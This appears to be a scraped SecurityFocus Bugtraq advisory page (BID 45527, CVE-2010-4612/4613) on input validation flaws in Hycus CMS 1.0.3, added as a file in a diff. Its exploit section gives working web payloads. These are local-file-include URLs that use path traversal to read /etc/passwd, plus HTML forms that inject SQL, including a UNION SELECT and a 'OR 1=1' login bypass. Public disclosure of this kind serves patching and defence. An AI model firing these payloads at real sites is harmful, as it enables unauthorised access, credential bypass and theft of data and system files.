@@ -1,0 +1,99 @@
+#SpeeDr00t@Black Falcon<br>#bid45527<p><b><span style="font-size: 18pt;">Hycus CMS Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/45527/info">info</a><br><a href="http://www.securityfocus.com/bid/45527/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/45527/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/45527/solution">solution</a><br><a href="http://www.securityfocus.com/bid/45527/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				45527
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2010-4612<br/>
+				
+					CVE-2010-4613<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 21 2010 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Apr 13 2015 09:02PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				High-Tech Bridge SA
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Hycus Hycus CMS 1.0.3 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit these issues via a browser.  To exploit a cross-site scripting vulnerability, the attacker must entice an unsuspecting user to visit a malicious URI.<br/><br/>The following example data is available:<br/><br/>Local File Include:<br/><br/>http://www.example.com/index.php?site=../../../../../../../etc/passwd%00<br/>http://www.example.com/admin.php?site=../../../../../../../etc/passwd%00<br/><br/>SQL Injection:<br/><br/>&amp;lt;form action="http://host/?user/1/forgotpass.html" method="post" name="main" &amp;gt;<br/>&amp;lt;input type="hidden" name="useremail" value="1'SQL_CODE"/&amp;gt;<br/>&amp;lt;input type="submit" value="submit" name="submit" /&amp;gt;<br/>&amp;lt;/form&amp;gt;<br/><br/>&amp;lt;form action="http://host/?search/1.html" method="post" name="main" &amp;gt;<br/>&amp;lt;input type="hidden" name="q" value="search' union select 1,2,@@version -- 3"/&amp;gt;<br/>&amp;lt;input type="submit" value="submit" name="submit" /&amp;gt;<br/>&amp;lt;/form&amp;gt;<br/><br/>&amp;lt;form action="http://host/?user/1/hregister.html" method="post" name="main" &amp;gt;<br/>&amp;lt;input type="hidden" name="full_name" value="username"/&amp;gt;<br/>&amp;lt;input type="hidden" name="user_name" value="1'SQL_CODE"/&amp;gt;<br/>&amp;lt;input type="hidden" name="usr_email" value="test@mail.com'SQL_CODE"/&amp;gt;<br/>&amp;lt;input type="hidden" name="pwd" value="123456"/&amp;gt;<br/>&amp;lt;input type="hidden" name="pwd2" value="123456"/&amp;gt;<br/>&amp;lt;input type="submit" value="submit" name="submit" /&amp;gt;<br/>&amp;lt;/form&amp;gt;<br/><br/>&amp;lt;form action="http://host/?user/1/hlogin.html" method="post" name="main" &amp;gt;<br/>&amp;lt;input type="hidden" name="usr_email" value="1' OR 1=1 -- 1"/&amp;gt;<br/>&amp;lt;input type="hidden" name="pwd" value="any"/&amp;gt;<br/>&amp;lt;input type="submit" value="submit" name="submit" /&amp;gt;<br/>&amp;lt;/form&amp;gt;
+	
+		<ul>
+</ul>
+</div>
